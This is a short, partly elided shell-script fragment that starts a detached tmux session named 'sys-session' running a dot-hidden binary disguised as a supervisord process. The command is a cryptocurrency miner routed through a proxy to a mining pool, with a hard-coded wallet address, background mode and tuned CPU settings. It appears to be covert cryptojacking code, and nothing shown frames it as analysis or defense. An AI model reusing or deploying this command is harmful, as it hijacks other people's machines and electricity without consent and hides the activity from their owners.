...
do
    ...
    tmux new -d -s sys-session "timeout 60m ./.supervisord-wr --algorithm yespowertide --disable-gpu --pool 103.249.70.7:6237 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=8TIDE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 --cpu-threads 8"
